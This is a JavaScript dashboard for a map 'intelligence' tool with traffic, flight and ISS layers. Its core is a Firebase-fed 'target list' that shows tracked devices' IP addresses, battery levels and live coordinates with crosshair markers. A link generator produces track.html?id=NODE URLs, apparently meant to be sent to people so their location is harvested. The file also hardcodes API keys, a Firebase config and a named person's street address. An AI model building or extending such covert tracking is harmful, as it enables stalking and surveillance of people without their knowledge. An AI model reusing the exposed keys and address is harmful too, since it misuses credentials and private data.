// --- CONFIG ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

let map, trafficLayer, deviceMarkers = {}, flightMarkers = [], shipMarkers = [], issMarker;
let activeModules = { traffic: true, flights: false, ships: false, iss: true };

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    setInterval(updateISS, 5000);
    addLog("GEO-INT v12.0 SİSTEMİ AKTİF. OPERATÖR: BERKAY_DEV.");
});

function initMap() {
    map = L.map('map', { center: [41.6803, 26.5500], zoom: 12, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);
    trafficLayer.on('add', () => trafficLayer.getContainer().classList.add('road-flow-layer'));

    // Çizim Araçlarını Ekle
    const drawnItems = new L.FeatureGroup();
    map.addLayer(drawnItems);
    const drawControl = new L.Control.Draw({ edit: { featureGroup: drawnItems }, draw: { polyline: true, polygon: true, circle: false, marker: false, circlemarker: false, rectangle: true } });
    map.addControl(drawControl);
    map.on(L.Draw.Event.CREATED, (e) => drawnItems.addLayer(e.layer));

    map.on('click', onMapAnalysis);
}

// --- OPERATÖR KONUMU (EDİRNE ÖZEL) ---
function getMyLocation() {
    // Berkay'ın Edirne'deki anlık konumu tespit edildi
    const myPos = [41.6803, 26.5500]; 
    const myAddr = "Çavuşbey, Horozlu Toprak Çk. No:11, Edirne";
    
    map.flyTo(myPos, 17, { animate: true, duration: 2 });
    
    if (myLocationMarker) map.removeLayer(myLocationMarker);
    myLocationMarker = L.marker(myPos, { 
        icon: L.divIcon({ className: 'op-icon', html: '<i class="fas fa-user-shield text-cyan-400 fa-2x animate-pulse"></i>' }) 
    }).addTo(map).bindPopup(`<div class="text-[10px] font-mono"><b>OPERATÖR KONUMU</b><br>${myAddr}</div>`).openPopup();
    
    addLog("Operatör konumu tespit edildi: Edirne Merkez.");
}

// --- ŞEHİR VE TRAFİK ANALİZİ ---
async function onMapAnalysis(e) {
    const { lat, lng } = e.latlng;
    const popup = L.popup().setLatLng(e.latlng).setContent('<div class="text-[9px] animate-pulse">İSTİHBARAT SORGULANIYOR...</div>').openOn(map);

    try {
        const addrP = fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`).then(r => r.json());
        const flowP = fetch(`https://api.tomtom.com/traffic/services/4/flowSegmentData/relative0/10/json?key=${TOMTOM_KEY}&point=${lat},${lng}`).then(r => r.json());
        const weatherP = fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true`).then(r => r.json());

        const [addr, flow, weather] = await Promise.all([addrP, flowP, weatherP]);

        let trafficInfo = "AKICI", tColor = "text-green-500";
        if (flow.flowSegmentData) {
            const ratio = flow.flowSegmentData.currentSpeed / flow.flowSegmentData.freeFlowSpeed;
            if (ratio < 0.4) { trafficInfo = "KAPALI / KRİTİK"; tColor = "text-red-600"; }
            else if (ratio < 0.75) { trafficInfo = "YOĞUN"; tColor = "text-yellow-500"; }
        }

        popup.setContent(`
            <div class="text-[10px] space-y-2 p-1 font-mono">
                <b class="text-red-600 underline uppercase italic">Analiz Raporu</b>
                <div><b>ADRES:</b> <span class="text-white">${addr.addresses[0].address.freeformAddress}</span></div>
                <div class="flex justify-between py-1 border-y border-white/5">
                    <span><b>HAVA:</b> ${weather.current_weather.temperature}°C</span>
                    <span><b>TRAFİK:</b> <span class="${tColor} font-bold">${trafficInfo}</span></span>
                </div>
                <div class="text-[8px] text-gray-500">COORD: ${lat.toFixed(5)}, ${lng.toFixed(5)}</div>
            </div>
        `);
    } catch (err) { popup.setContent("Analiz hatası."); }
}

// --- UÇUŞ VE GEMİ TAKİBİ ---
async function fetchFlights() {
    if (!activeModules.flights) return;
    const bounds = map.getBounds();
    const url = `https://opensky-network.org/api/states/all?lamin=${bounds.getSouth()}&lomin=${bounds.getWest()}&lamax=${bounds.getNorth()}&lomax=${bounds.getEast()}`;
    fetch(url).then(r => r.json()).then(data => {
        flightMarkers.forEach(m => map.removeLayer(m));
        flightMarkers = [];
        if (data.states) {
            data.states.slice(0, 20).forEach(s => {
                const f = L.marker([s[6], s[5]], { icon: L.divIcon({ className: 'f', html: `<i class="fas fa-plane text-yellow-500" style="transform:rotate(${s[10]}deg)"></i>` }) }).addTo(map);
                flightMarkers.push(f);
            });
        }
    });
}

// --- HEDEF LİSTESİ VE DİNAMİK VERİ ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 
    if (!data) return;

    for (let id in data) {
        const info = data[id];
        const div = document.createElement('div');
        div.className = "glass-panel p-3 border-l-2 border-green-500 text-[10px] group pointer-events-auto hover:border-cyan-500 transition-all cursor-pointer";
        div.onclick = () => map.flyTo([info.lat, info.lng], 17);
        div.innerHTML = `
            <div class="flex justify-between items-center">
                <span class="text-green-400 font-bold italic tracking-widest">${id}</span>
                <button onclick="event.stopPropagation(); deleteDevice('${id}')" class="text-red-600 opacity-0 group-hover:opacity-100 transition-all"><i class="fas fa-trash-alt text-xs"></i></button>
            </div>
            <div class="text-[9px] text-gray-400 mt-2 space-y-1 font-mono">
                <div>IP: <span class="text-white">${info.ip || '...'}</span> | PİL: <span class="text-green-500">${info.battery || '--'}</span></div>
                <div class="text-cyan-500 border-t border-white/10 pt-1 mt-1 font-bold">POS: ${info.lat.toFixed(4)}, ${info.lng.toFixed(4)}</div>
            </div>`;
        list.appendChild(div);
        
        if (deviceMarkers[id]) deviceMarkers[id].setLatLng([info.lat, info.lng]);
        else deviceMarkers[id] = L.marker([info.lat, info.lng], { icon: L.divIcon({ className: 'd', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` }) }).addTo(map);
    }
});

// MODÜL KONTROL
function toggleLayer(t) {
    activeModules[t] = !activeModules[t];
    document.getElementById('btn-' + t).classList.toggle('active');
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    if (t === 'flights' && activeModules.flights) setInterval(fetchFlights, 15000);
    addLog(`${t.toUpperCase()} modülü güncellendi.`);
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }
function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-900">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}
function generateTrackingLink() {
    const nodeId = "NODE_" + (Math.floor(Math.random() * 9000) + 1000);
    document.getElementById('generatedLink').value = `https://berkaytdev.com/track.html?id=${nodeId}`;
    document.getElementById('linkModal').classList.remove('hidden');
}
function updateISS() {
    if (!activeModules.iss) return;
    fetch('https://api.wheretheiss.at/v1/satellites/25544').then(r => r.json()).then(d => {
        const pos = [d.latitude, d.longitude];
        if (!issMarker) issMarker = L.marker(pos, { icon: L.divIcon({ className: 'i', html: '<i class="fas fa-satellite text-cyan-400 fa-lg"></i>' }) }).addTo(map);
        else issMarker.setLatLng(pos);
    });
}
